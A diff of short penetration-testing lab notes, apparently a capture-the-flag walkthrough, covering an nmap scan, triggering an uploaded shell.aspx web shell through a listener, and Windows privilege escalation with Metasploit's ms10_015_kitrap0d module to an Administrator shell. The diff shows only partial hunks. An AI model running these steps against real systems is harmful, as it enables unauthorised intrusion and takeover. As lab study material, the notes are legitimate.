@@ -1,14 +1,20 @@
 Scanning 
 
-Nmap -A 10.10.10.5
+
+
+	
+	
+	
+
+nmap -A ip_machine
 
 Option -A enable :
+
 	- version detection
 	- OS detection
 	- script scanning
 	- traceroute
 
-nmap -A  10.10.10.5
 
 PORT     STATE SERVICE            VERSION
 21/tcp   open  ftp                Microsoft ftpd
@@ -59,10 +65,10 @@ Run listener
 
 Command run -j
 
-open url "http://10.10.10.5/shell.aspx" in browser and view page source
+open url "http://machine_ip/shell.aspx" in browser and view page source
 
 
-you gained access
+I gained access
 
 
 Privilege escalation 
@@ -71,4 +77,4 @@ Privilege escalation
 Use post/multi/recon/local_exploit_suggester and set session number and run after that 
 use exploit/windows/local/ms10_015_kitrap0d and set session number and LHOST
 
-You have a shell as Administrator
+I have a shell as Administrator
